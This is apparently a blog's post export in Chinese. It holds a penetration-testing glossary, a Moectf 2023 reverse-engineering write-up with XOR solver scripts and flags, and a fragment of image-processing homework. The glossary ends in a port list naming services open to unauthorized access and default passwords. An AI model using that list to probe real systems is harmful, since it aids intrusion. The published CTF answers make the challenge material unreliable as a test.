title="安全资源池（安全资源池）"></a>安全资源池（安全资源池）</h2><p>安全资源池是多种安全产品虚拟化的集合，涵盖了服务器终端、网络、业务、数据等多种安全能力。</p><h2 id="区块链（区块链）"><a href="#区块链（区块链）" class="headerlink" title="区块链（区块链）"></a>区块链（区块链）</h2><p>英文名为blockchain。</p><p>区块链是一个信息技术领域的术语。从本质上讲，它是一个共享数据库，存储于其中的数据或信息，具有“不可伪造”“全程留痕”“可以追溯”“公开透明”“集体维护”等特征。</p><p>基于这些特征，区块链技术奠定了坚实的“信任”基础，创造了可靠的“合作”机制，具有广阔的运用前景。</p><h2 id="安全众测"><a href="#安全众测" class="headerlink" title="安全众测"></a>安全众测</h2><p>借助众多白帽子的力量，针对目标系统在规定时间内进行漏洞悬赏测试。</p><p>您在收到有效的漏洞后，按漏洞风险等级给予白帽子一定的奖励。通常情况下是按漏洞付费，性价比较高。</p><p>同时，不同白帽子的技能研究方向可能不同，在进行测试的时候更为全面。</p><h2 id="代码审计（代码审计）"><a href="#代码审计（代码审计）" class="headerlink" title="代码审计（代码审计）"></a>代码审计（代码审计）</h2><p>代码审计（Code audit）是一种以发现程序错误，安全漏洞和违反程序规范为目标的源代码分析。软件代码审计是对编程项目中源代码的全面分析，旨在发现错误，安全漏洞或违反编程约定。 它是防御性编程范例的一个组成部分，它试图在软件发布之前减少错误。</p><p>C和C ++源代码是最常见的审计代码，因为许多高级语言（如Python）具有较少的潜在易受攻击的功能（例如，不检查边界的函数）。</p><p>简单来说：就是检查源代码中的安全缺陷，检查程序源代码是否存在安全隐患，或者有编码不规范的地方，通过自动化工具或者人工审查的方式，对程序源代码逐条进行检查和分析，发现这些源代码缺陷引发的安全漏洞，并提供代码修订措施和建议。</p><h2 id="数据脱敏"><a href="#数据脱敏" class="headerlink" title="数据脱敏"></a>数据脱敏</h2><p>数据脱敏是指对某些敏感信息通过脱敏规则进行数据的变形，实现敏感隐私数据的可靠保护。</p><p>在涉及客户安全数据或者一些商业性敏感数据的情况下，在不违反系统规则条件下，对真实数据进行改造并提供测试使用，如身份证号、手机号、卡号、客户号等个人信息都需要进行数据脱敏。</p><p>简单来说：数据脱敏是指对某些敏感信息通过脱敏规则进行数据的变形，实现敏感隐私数据的可靠保护，主要用于数据的共享和交易等涉及大范围数据流动的场景。</p><h2 id="箱子"><a href="#箱子" class="headerlink" title="箱子"></a>箱子</h2><p>箱子就是别人通过将木马挂在网页上，然后别人点击了这个网页后就中了木马，登陆游戏后木马就会记录这个人的游戏帐号密码，然后发到挂木马这个人的指定的一个地方。</p><p>这个地方就叫游戏箱子。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>你发现了一个漏洞你需要将这个漏洞展示出来。</p><h2 id="软件木马"><a href="#软件木马" class="headerlink" title="软件木马"></a>软件木马</h2><p>远控软件的被控端 (exe 文件)。</p><h2 id="脚本木马"><a href="#脚本木马" class="headerlink" title="脚本木马"></a>脚本木马</h2><p>脚本语言编写的被控端 (asp、php…)</p><h2 id="3389肉鸡"><a href="#3389肉鸡" class="headerlink" title="3389肉鸡"></a>3389肉鸡</h2><p>3389是WINDWS终端服务（Terminal Services）所默认使用的端口号，该服务是微软为了方便网络管理员远程管理及维护服务器而推出的，网络管理员可以使用远程桌面连接到网络上任意一台开启了终端服务的计算机上，成功登陆后就会象操作自己的电脑一样来操作主机了。</p><p>这和远程控制软件甚至是木马程序实现的功能很相似，终端服务的连接非常稳定，而且任何杀毒软件都不会查杀，所以也深受黑客喜爱。黑客在拿下了一台主机后，通常都会想办法先添加一个属于自己的后门帐号，然后再开启对方的终端服务，这样，自己就随时可以使用终端服务来控制对方了，这样的主机，通常就会被叫做3389肉鸡。</p><h2 id="4899肉鸡"><a href="#4899肉鸡" class="headerlink" title="4899肉鸡"></a>4899肉鸡</h2><p>Radmin是一款非常优秀的远程控制软件，4899就是Radmin默认使以也经常被黑客当作木马来使用（正是这个原因，目前的杀毒软件也对Radmin查杀了）。</p><p>有的人在使用的服务端口号。</p><p>因为Radmin的控制功能非常强大，传输速度也比大多数木马快，而且又不被杀毒软件所查杀，所用Radmin管理远程电脑时使用的是空口令或者是弱口令，黑客就可以使用一些软件扫描网络上存在Radmin空口令或者弱口令的主机，然后就可以登陆上去远程控制对恶劣，这样被控制的主机通常就被成做4899肉鸡。</p><h2 id="缓冲区溢出"><a href="#缓冲区溢出" class="headerlink" title="缓冲区溢出"></a>缓冲区溢出</h2><p>功击者向一个地址区输入这个区间存储不下的大量字符。</p><p>在某些性况下，这些多余的字符可以作为”执行代码”来运行，因此足以使功击者不受安全措施限制地获得计算机的控制权。</p><h2 id="嗅控器（Snifffer）"><a href="#嗅控器（Snifffer）" class="headerlink" title="嗅控器（Snifffer）"></a>嗅控器（Snifffer）</h2><p>就是能够捕获网络报文的设备。</p><p>嗅控器的正当用处在于分析网络的流量，以便找出所关心的网络中潜在的问题。</p><h2 id="CMD"><a href="#CMD" class="headerlink" title="CMD"></a>CMD</h2><p>是一个所谓命令行控制台。有两条进入该程序的通道：</p><p>第一、鼠标点击”开始—运行”，在出现的编辑框中键入”CMD”，然后点击”确定”；</p><p>第二、在启动Windows2000的时候，按F8进入启动选择菜单，移动光条或键入数字至安全模式的命令行状态。</p><p>出现的窗口是一个在win9x系统常见的那种MSDOS方式的界面。</p><p>尽管微软把这个工具当做命令解释器一个新的实例，但使用方法去和原来的DOS没有区别。</p><h2 id="powershell-windows-power-shell"><a href="#powershell-windows-power-shell" class="headerlink" title="powershell(windows power shell)"></a>powershell(windows power shell)</h2><p>Windows PowerShell 是一种命令行外壳程序和脚本环境，使命令行用户和脚本编写者可以利用 .NET Framework的强大功能。</p><p>它引入了许多非常有用的新概念，从而进一步扩展了您在 Windows 命令提示符和 Windows Script Host 环境中获得的知识和创建的脚本。</p><p>Windows PowerShell v3将伴随着Microsoft Hyper-V3.0和windows server 2012发布。</p><p>PowerShell v3是一个Windows任务自动化的框架，它由一个命令行shell和内置在这个.NET框架上的编程语言组成。</p><p>PowerShell v3采用新的cmdlet让管理员能够更深入到系统进程中，这些进程可以制作成可执行的文件或脚本（script）。</p><p>一条cmdlet是一条轻量命令，Windows PowerShell运行时间在自动化脚本的环境里调用它。</p><p>Cmdlet包括显示当前目录的Get-Location，访问文件内容的Get-Content和结束运行进程的Stop-Process。</p><p>PowerShell v3在Windows Server 8中装载了Windows Management Framework 3.0。PowerShell运行环境也能嵌入到其它应用。</p><h2 id="常见端口"><a href="#常见端口" class="headerlink" title="常见端口"></a>常见端口</h2><p>21 ftp<br>22 SSH<br>23 Telnet<br>80 web<br>80-89 web<br>161 SNMP<br>389 LDAP<br>443 SSL心脏滴血以及一些web漏洞测试<br>445 SMB<br>512,513,514 Rexec<br>873 Rsync未授权<br>1025,111 NFS<br>1433 MSSQL<br>1521 Oracle:(iSqlPlus Port:5560,7778)<br>2082/2083 cpanel主机管理系统登陆 （国外用较多）<br>2222 DA虚拟主机管理系统登陆 （国外用较多）<br>2601,2604 zebra路由，默认密码zebra<br>3128 squid代理默认端口，如果没设置口令很可能就直接漫游内网了<br>3306 MySQL<br>3312/3311 kangle主机管理系统登陆<br>3389 远程桌面<br>4440 rundeck 参考WooYun: 借用新浪某服务成功漫游新浪内网<br>5432 PostgreSQL<br>5900 vnc<br>5984 CouchDB <a href="http://xxx:5984/_utils/">http://xxx:5984/_utils/</a><br>6082 varnish 参考WooYun: Varnish HTTP accelerator CLI 未授权访问易导致网站被直接篡改或者作为代理进入内网<br>6379 redis未授权<br>7001,7002 WebLogic默认弱口令，反序列<br>7778 Kloxo主机控制面板登录<br>8000-9090 都是一些常见的web端口，有些运维喜欢把管理后台开在这些非80的端口上<br>8080 tomcat/WDCP主机管理系统，默认弱口令<br>8080,8089,9090 JBOSS<br>8083 Vestacp主机管理系统 （国外用较多）<br>8649 ganglia<br>8888 amh/LuManager 主机管理系统默认端口<br>9200,9300 elasticsearch 参考WooYun: 多玩某服务器ElasticSearch命令执行漏洞<br>10000 Virtualmin/Webmin 服务器虚拟主机管理系统<br>11211 memcache未授权访问<br>27017,27018 Mongodb未授权访问<br>28017 mongodb统计页面<br>50000 SAP命令执行<br>50070,50030 hadoop默认端口未授权访问<br>554 实时流协议（监控）53 dns 110 pop3 1080 socket5</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 渗透术语 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Moectf 2023 Re-Writeup</title>
      <link href="/posts/659.html"/>
      <url>/posts/659.html</url>
      
        <content type="html"><![CDATA[<h1 id="base-64"><a href="#base-64" class="headerlink" title="base_64"></a>base_64</h1><p>uncompyle6反编译pyc</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># uncompyle6 version 3.9.0</span></span><br><span class="line"><span class="comment"># Python bytecode version base 3.7.0 (3394)</span></span><br><span class="line"><span class="comment"># Decompiled from: Python 3.10.0 (tags/v3.10.0:b494f59, Oct  4 2021, 19:00:18) [MSC v.1929 64 bit (AMD64)]</span></span><br><span class="line"><span class="comment"># Embedded file name: C:\Users\王旭东\Desktop\dasktop\vs\vs_code\moectf2023\re\base_64.py</span></span><br><span class="line"><span class="comment"># Compiled at: 2023-08-07 16:29:30</span></span><br><span class="line"><span class="comment"># Size of source mod 2**32: 685 bytes</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> *</span><br><span class="line">str1 = <span class="string">&#x27;yD9oB3Inv3YAB19YynIuJnUaAGB0um0=&#x27;</span></span><br><span class="line">string1 = <span class="string">&#x27;ZYXWVUTSRQPONMLKJIHGFEDCBAzyxwvutsrqponmlkjihgfedcba0123456789+/&#x27;</span></span><br><span class="line">string2 = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line">flag = <span class="built_in">input</span>(<span class="string">&#x27;welcome to moectf\ninput your flag and I wiil check it:&#x27;</span>)</span><br><span class="line">enc_flag = base64.b64encode(flag.encode()).decode()</span><br><span class="line">enc_flag = enc_flag.translate(<span class="built_in">str</span>.maketrans(string2, string1))</span><br><span class="line"><span class="keyword">if</span> enc_flag == str1:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;good job!!!!&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;something wrong???&#x27;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># okay decompiling .\base_64.pyc</span></span><br></pre></td></tr></table></figure><p>enc_flag经过str.maketrans方法处理，将string2表中的字母替换成了string1表内的，两个交换一下还原出flag的密文再base64解码一下即可。</p><p><code>moectf&#123;pYc_And_Base64~&#125;</code></p><h1 id="UPX"><a href="#UPX" class="headerlink" title="UPX!"></a>UPX!</h1><p>peid看到加了upx的壳，upx脱下壳就行。</p><p><img src="https://s2.loli.net/2023/08/22/P7X5q4TvaE8Vztw.png" alt="image-20230822095856028"></p><p>核心代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( j = <span class="number">0</span>; ; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = j;</span><br><span class="line">    v2 = sub_140073829(v6);</span><br><span class="line">    <span class="keyword">if</span> ( v8 &gt;= v2 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v6[j] ^= <span class="number">0x67</span>u;</span><br><span class="line">    <span class="keyword">if</span> ( byte_140196000[j] != v6[j] )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_140073973(<span class="string">&quot;try again~~&quot;</span>);</span><br><span class="line">      sub_1400723F7(<span class="number">0</span>i64);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_140073973(<span class="string">&quot;you are so clever!&quot;</span>);</span><br></pre></td></tr></table></figure><p>考点还是异或，没啥说的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">enc = [</span><br><span class="line">    <span class="number">0x0A</span>, <span class="number">0x08</span>, <span class="number">0x02</span>, <span class="number">0x04</span>, <span class="number">0x13</span>, <span class="number">0x01</span>, <span class="number">0x1C</span>, <span class="number">0x57</span>, <span class="number">0x0F</span>, <span class="number">0x38</span>,</span><br><span class="line">    <span class="number">0x1E</span>, <span class="number">0x57</span>, <span class="number">0x12</span>, <span class="number">0x38</span>, <span class="number">0x2C</span>, <span class="number">0x09</span>, <span class="number">0x57</span>, <span class="number">0x10</span>, <span class="number">0x38</span>, <span class="number">0x2F</span>,</span><br><span class="line">    <span class="number">0x57</span>, <span class="number">0x10</span>, <span class="number">0x38</span>, <span class="number">0x13</span>, <span class="number">0x08</span>, <span class="number">0x38</span>, <span class="number">0x35</span>, <span class="number">0x02</span>, <span class="number">0x11</span>, <span class="number">0x54</span>,</span><br><span class="line">    <span class="number">0x15</span>, <span class="number">0x14</span>, <span class="number">0x02</span>, <span class="number">0x38</span>, <span class="number">0x32</span>, <span class="number">0x37</span>, <span class="number">0x3F</span>, <span class="number">0x46</span>, <span class="number">0x46</span>, <span class="number">0x46</span>,</span><br><span class="line">    <span class="number">0x1A</span></span><br><span class="line">]</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">    flag += <span class="built_in">chr</span>(enc[i] ^ <span class="number">0x67</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p><code>moectf&#123;0h_y0u_Kn0w_H0w_to_Rev3rse_UPX!!!&#125;</code></p><h1 id="Xor"><a href="#Xor" class="headerlink" title="Xor"></a>Xor</h1><p>核心代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">gets(input);</span><br><span class="line"> for ( i = 0; i &lt; 28; ++i )</span><br><span class="line"> &#123;</span><br><span class="line">   if ( enc[i] != (input[i] ^ 0x39) )</span><br><span class="line">   &#123;</span><br><span class="line">     puts(&quot;Seems not right&quot;);</span><br><span class="line">     exit(0);</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> puts(&quot;GOOD!&quot;);</span><br></pre></td></tr></table></figure><p>输入的flag与0x39异或得到密文，再异或个0x39就能还原出flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">enc = [</span><br><span class="line">    <span class="number">0x54</span>, <span class="number">0x56</span>, <span class="number">0x5C</span>, <span class="number">0x5A</span>, <span class="number">0x4D</span>, <span class="number">0x5F</span>, <span class="number">0x42</span>, <span class="number">0x60</span>, <span class="number">0x56</span>, <span class="number">0x4C</span>,</span><br><span class="line">    <span class="number">0x66</span>, <span class="number">0x52</span>, <span class="number">0x57</span>, <span class="number">0x09</span>, <span class="number">0x4E</span>, <span class="number">0x66</span>, <span class="number">0x51</span>, <span class="number">0x09</span>, <span class="number">0x4E</span>, <span class="number">0x66</span>,</span><br><span class="line">    <span class="number">0x4D</span>, <span class="number">0x09</span>, <span class="number">0x66</span>, <span class="number">0x61</span>, <span class="number">0x09</span>, <span class="number">0x6B</span>, <span class="number">0x18</span>, <span class="number">0x44</span></span><br><span class="line">]</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">    flag += <span class="built_in">chr</span>(enc[i] ^ <span class="number">0x39</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p><code>moectf&#123;You_kn0w_h0w_t0_X0R!&#125;</code></p><h1 id="ANDROID"><a href="#ANDROID" class="headerlink" title="ANDROID"></a>ANDROID</h1><p>核心代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="type">char</span>[] enc;</span><br><span class="line">    <span class="type">char</span>[] key;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MainActivity</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.enc = <span class="keyword">new</span> <span class="title class_">char</span>[]&#123;<span class="string">&#x27;\u0019&#x27;</span>, <span class="string">&#x27;\u0007&#x27;</span>, <span class="string">&#x27;\u0000&#x27;</span>, <span class="string">&#x27;\u000E&#x27;</span>, <span class="string">&#x27;\u001B&#x27;</span>, <span class="string">&#x27;\u0003&#x27;</span>, <span class="string">&#x27;\u0010&#x27;</span>, <span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;\u0018&#x27;</span>, <span class="string">&#x27;\u0002&#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;\u0004&#x27;</span>, <span class="string">&#x27;\u0001&#x27;</span>, <span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;\u000B&#x27;</span>, <span class="string">&#x27;\u001D&#x27;</span>, <span class="string">&#x27;\u0006&#x27;</span>, <span class="string">&#x27;\u0007&#x27;</span>, <span class="string">&#x27;\f&#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;\u0018&#x27;</span>, <span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;\u001C&#x27;</span>, <span class="string">&#x27;\u0015&#x27;</span>, <span class="string">&#x27;\u001B&#x27;</span>, <span class="string">&#x27;\u001C&#x27;</span>, <span class="string">&#x27;\u0010&#x27;</span>&#125;;</span><br><span class="line">        <span class="built_in">this</span>.key = <span class="keyword">new</span> <span class="title class_">char</span>[]&#123;<span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;y&#x27;</span>&#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span>  <span class="comment">// androidx.fragment.app.FragmentActivity</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle arg3)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(arg3);</span><br><span class="line">        <span class="built_in">this</span>.setContentView(<span class="number">0x7F0B001C</span>);  <span class="comment">// layout:activity_main</span></span><br><span class="line">        ((Button)<span class="built_in">this</span>.findViewById(<span class="number">0x7F080074</span>)).setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123;  <span class="comment">// id:check</span></span><br><span class="line">            <span class="meta">@Override</span>  <span class="comment">// android.view.View$OnClickListener</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View arg7)</span> &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">v7</span> <span class="operator">=</span> ((EditText)<span class="built_in">this</span>.findViewById(<span class="number">0x7F0800E4</span>)).getText().toString();  <span class="comment">// id:input</span></span><br><span class="line">                <span class="keyword">if</span>(v7.length() != <span class="number">0x1F</span>) &#123;</span><br><span class="line">                    Toast.makeText(MainActivity.<span class="built_in">this</span>.getApplicationContext(), <span class="string">&quot;长度不对哦&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="type">byte</span>[] v7_1 = v7.getBytes();</span><br><span class="line">                <span class="type">int</span> v0;</span><br><span class="line">                <span class="keyword">for</span>(v0 = <span class="number">0</span>; v0 &lt; <span class="number">0x1F</span>; ++v0) &#123;</span><br><span class="line">                    <span class="keyword">if</span>((v7_1[v0] ^ MainActivity.<span class="built_in">this</span>.key[v0 % MainActivity.<span class="built_in">this</span>.key.length]) != MainActivity.<span class="built_in">this</span>.enc[v0]) &#123;</span><br><span class="line">                        Toast.makeText(MainActivity.<span class="built_in">this</span>.getApplicationContext(), <span class="string">&quot;好像有哪里不对&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">                        <span class="keyword">return</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                Toast.makeText(MainActivity.<span class="built_in">this</span>.getApplicationContext(), <span class="string">&quot;恭喜！回答正确&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码定义了一个加密字符串（enc）和一个密钥（key），然后在 onCreate() 方法中检查文本框中输入的异或处理过的字符串是否与加密字符串匹配。</p><p>核心代码即<code>v7_1[v0] ^ MainActivity.this.key[v0 % MainActivity.this.key.length]) != MainActivity.this.enc[v0]</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">enc = [<span class="string">&#x27;\u0019&#x27;</span>, <span class="string">&#x27;\u0007&#x27;</span>, <span class="string">&#x27;\u0000&#x27;</span>, <span class="string">&#x27;\u000E&#x27;</span>, <span class="string">&#x27;\u001B&#x27;</span>, <span class="string">&#x27;\u0003&#x27;</span>, <span class="string">&#x27;\u0010&#x27;</span>, <span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;\u0018&#x27;</span>, <span class="string">&#x27;\u0002&#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;\u0004&#x27;</span>, <span class="string">&#x27;\u0001&#x27;</span>, <span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;\u000B&#x27;</span>, <span class="string">&#x27;\u001D&#x27;</span>, <span class="string">&#x27;\u0006&#x27;</span>, <span class="string">&#x27;\u0007&#x27;</span>, <span class="string">&#x27;\f&#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;\u0018&#x27;</span>, <span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;\u001C&#x27;</span>, <span class="string">&#x27;\u0015&#x27;</span>, <span class="string">&#x27;\u001B&#x27;</span>, <span class="string">&#x27;\u001C&#x27;</span>, <span class="string">&#x27;\u0010&#x27;</span>]</span><br><span class="line">key = [<span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;y&#x27;</span>]</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> v0 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">31</span>):</span><br><span class="line">    flag += <span class="built_in">chr</span>(<span class="built_in">ord</span>(enc[v0]) ^ <span class="built_in">ord</span>(key[v0 % <span class="built_in">len</span>(key)]))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p><code>moectf&#123;Java_in_Android_1s_easy&#125;</code></p><h1 id="EQUATION"><a href="#EQUATION" class="headerlink" title="EQUATION"></a>EQUATION</h1>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>xxe漏洞学习</title>
      <link href="/posts/d364.html"/>
      <url>/posts/d364.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>数字图像 小计</title>
      <link href="/posts/f978.html"/>
      <url>/posts/f978.html</url>
      
        <content type="html"><![CDATA[<h2 id="问题1："><a href="#问题1：" class="headerlink" title="问题1："></a>问题1：</h2><p><img src="https://s2.loli.net/2023/09/17/wJKbTnDvA4Xx2rB.png" alt="image-20230917152434059"></p><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建空白图像</span></span><br><span class="line">image = Image.new(<span class="string">&quot;RGB&quot;</span>, (<span class="number">128</span>, <span class="number">128</span>))</span><br><span class="line"><span class="comment"># 设置颜色值</span></span><br><span class="line">red = (<span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">blue = (<span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>)</span><br><span class="line">green = (<span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>)</span><br><span class="line">black = (<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line"><span class="comment"># 填充颜色</span></span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">        image.putpixel((x, y), red)  <span class="comment"># 左上角为红色</span></span><br><span class="line">        image.putpixel((x, y + <span class="number">64</span>), blue)  <span class="comment"># 左下角为蓝色</span></span><br><span class="line">        image.putpixel((x + <span class="number">64</span>, y), green)  <span class="comment"># 右上角为绿色</span></span><br><span class="line">        image.putpixel((x + <span class="number">64</span>, y + <span class="number">64</span>), black)  <span class="comment"># 右下角为黑色</span></span><br><span class="line"><span class="comment"># 显示图像</span></span><br><span class="line">image.show()</span><br></pre></td></tr></table></figure><h3 id="问题1运行结果："><a href="#问题1运行结果：" class="headerlink" title="问题1运行结果："></a>问题1运行结果：</h3><p><img src="https://s2.loli.net/2023/09/13/C2EVmGBdQg9fbpo.png" alt="image-20230913205633480"></p><h2 id="问题2"><a href="#问题2" class="headerlink" title="问题2"></a>问题2</h2><p><img src="https://s2.loli.net/2023/09/17/Oh3tLlpTmqoASJr.png" alt="image-20230917152452138"></p><p>如果比特数增加了，灰度值的数量将会翻倍。随着不同灰度级别数量的增加，我们将更难以在不同级别之间视觉上区分边界。</p><h3 id="问题解决思路："><a href="#问题解决思路：" 